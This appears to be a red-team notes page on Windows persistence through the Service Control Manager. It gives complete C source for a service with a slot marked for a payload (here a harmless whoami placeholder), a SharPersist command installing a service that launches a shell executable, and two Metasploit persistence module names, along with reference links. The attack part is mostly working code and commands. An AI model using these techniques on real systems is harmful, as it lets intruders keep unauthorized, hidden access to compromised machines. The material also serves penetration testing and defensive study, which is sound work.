# Service Controller Manager (SCM)

## 01 - Manual

`$ cat windows_service.c`

---

```c
#include <windows.h>
#include <stdio.h>

#define SLEEP_TIME 5000

SERVICE_STATUS ServiceStatus;
SERVICE_STATUS_HANDLE hStatus;

void ServiceMain(int argc, char** argv);
void ControlHandler(DWORD request);

//add the payload here
int Run() {
    system("whoami > c:\\windows\\temp\\service.txt");
    return 0;
}

int main() {
    SERVICE_TABLE_ENTRY ServiceTable[2];
    ServiceTable[0].lpServiceName = "MyService";
    ServiceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;

    ServiceTable[1].lpServiceName = NULL;
    ServiceTable[1].lpServiceProc = NULL;

    StartServiceCtrlDispatcher(ServiceTable);
    return 0;
}

void ServiceMain(int argc, char** argv) {
    ServiceStatus.dwServiceType        = SERVICE_WIN32;
    ServiceStatus.dwCurrentState       = SERVICE_START_PENDING;
    ServiceStatus.dwControlsAccepted   = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    ServiceStatus.dwWin32ExitCode      = 0;
    ServiceStatus.dwServiceSpecificExitCode = 0;
    ServiceStatus.dwCheckPoint         = 0;
    ServiceStatus.dwWaitHint           = 0;

    hStatus = RegisterServiceCtrlHandler("MyService", (LPHANDLER_FUNCTION)ControlHandler);
    Run();

    ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    SetServiceStatus (hStatus, &ServiceStatus);

    while (ServiceStatus.dwCurrentState == SERVICE_RUNNING) {
                Sleep(SLEEP_TIME);
    }
    return;
}

void ControlHandler(DWORD request) {
    switch(request) {
        case SERVICE_CONTROL_STOP:
                        ServiceStatus.dwWin32ExitCode = 0;
            ServiceStatus.dwCurrentState  = SERVICE_STOPPED;
            SetServiceStatus (hStatus, &ServiceStatus);
            return;

        case SERVICE_CONTROL_SHUTDOWN:
            ServiceStatus.dwWin32ExitCode = 0;
            ServiceStatus.dwCurrentState  = SERVICE_STOPPED;
            SetServiceStatus (hStatus, &ServiceStatus);
            return;

        default:
            break;
    }
    SetServiceStatus (hStatus,  &ServiceStatus);
    return;
}
```

## 02 - SharPersist

`C:\> SharPersist -t service -c "C:\Windows\System32\cmd.exe" -a "/c C:\path\to\shell.exe" -n "servicesvc" -m add`

## 03 - Metasploit

TODO: Provide a step by step with these two modules

```
msf > use exploit/windows/local/persistence_service
```

```
msf > use post/windows/manage/persistence_exe
```

## References

- [Mandiant: SharPersist Windows Persistence Toolkit](https://www.mandiant.com/resources/sharpersist-windows-persistence-toolkit)

- [Zweilosec: Windows RedTeam Persistence](https://zweilosec.gitbook.io/hackers-rest/windows-1/windows-redteam/persistence)

- [Persistence Info](https://persistence-info.github.io/)

- [PentestLab: Persistence New Service](https://pentestlab.blog/2019/10/07/persistence-new-service/)

- [PentestLab: Persistence Service Control Manager](https://pentestlab.blog/2023/03/20/persistence-service-control-manager/)